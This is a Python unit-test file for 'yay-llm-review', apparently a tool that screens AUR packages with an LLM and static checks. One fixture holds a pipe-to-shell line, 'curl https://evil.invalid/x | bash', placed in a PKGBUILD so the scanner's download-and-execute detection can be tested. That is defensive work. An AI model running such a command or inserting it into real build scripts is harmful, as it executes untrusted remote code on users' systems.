#!/usr/bin/env python3
from __future__ import annotations

import importlib.machinery
import importlib.util
import json
import os
import subprocess
import tempfile
import unittest
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent
SCRIPT = ROOT / "yay-llm-review"
loader = importlib.machinery.SourceFileLoader("yay_llm_review", str(SCRIPT))
spec = importlib.util.spec_from_loader(loader.name, loader)
module = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = module
assert spec.loader is not None
spec.loader.exec_module(module)


class ReviewTests(unittest.TestCase):
    def test_endpoint_normalization(self) -> None:
        self.assertEqual(
            module.normalize_chat_endpoint("http://localhost:8080"),
            "http://localhost:8080/v1/chat/completions",
        )
        self.assertEqual(
            module.normalize_chat_endpoint("http://localhost:8080/v1"),
            "http://localhost:8080/v1/chat/completions",
        )
        self.assertEqual(
            module.normalize_chat_endpoint("http://localhost:8080/v1/chat/completions"),
            "http://localhost:8080/v1/chat/completions",
        )

    def test_model_json_fence(self) -> None:
        review = {
            "risk_level": "safe",
            "confidence": 0.9,
            "summary": "No suspicious behavior.",
            "recommended_action": "allow",
            "findings": [],
        }
        parsed = module.parse_json_content("```json\n" + json.dumps(review) + "\n```")
        self.assertEqual(module.validate_review(parsed)["risk_level"], "safe")

    def test_status_threshold(self) -> None:
        config = module.merge_config({"block_threshold": "high"})
        base = {
            "confidence": 0.8,
            "summary": "x",
            "recommended_action": "inspect",
            "findings": [],
        }
        self.assertEqual(module.status_from_review({**base, "risk_level": "medium"}, config), "WARN")
        self.assertEqual(module.status_from_review({**base, "risk_level": "high"}, config), "BLOCK")
        self.assertEqual(module.status_from_review({**base, "risk_level": "uncertain"}, config), "WARN")

    def test_static_pipe_to_shell(self) -> None:
        files = (module.PackageFile("PKGBUILD", "prepare() { curl https://evil.invalid/x | bash; }"),)
        findings = module.static_findings(files)
        self.assertTrue(any(item["category"] == "download-and-execute" for item in findings))

    def test_collect_does_not_follow_symlink(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "PKGBUILD").write_text("pkgname=x\npkgver=1\npkgrel=1\narch=('any')\n", encoding="utf-8")
            (root / "outside").write_text("secret", encoding="utf-8")
            subprocess.run(["git", "init", "-q", str(root)], check=True)
            os.symlink("../outside", root / "link")
            subprocess.run(["git", "-C", str(root), "add", "PKGBUILD", "link"], check=True)
            files = module.collect_files(root, module.merge_config({}))
            link = next(item for item in files if item.path == "link")
            self.assertEqual(link.content, "")
            self.assertEqual(link.symlink_target, "../outside")

    def test_init_is_idempotent(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            env = dict(os.environ)
            env["XDG_CONFIG_HOME"] = str(Path(directory) / "config")
            env["XDG_CACHE_HOME"] = str(Path(directory) / "cache")
            subprocess.run([str(SCRIPT), "init"], check=True, env=env, stdout=subprocess.PIPE, text=True)
            subprocess.run([str(SCRIPT), "init"], check=True, env=env, stdout=subprocess.PIPE, text=True)
            init_lua = Path(env["XDG_CONFIG_HOME"]) / "yay" / "init.lua"
            content = init_lua.read_text(encoding="utf-8")
            self.assertEqual(content.count(module.MANAGED_BEGIN), 1)


if __name__ == "__main__":
    unittest.main()
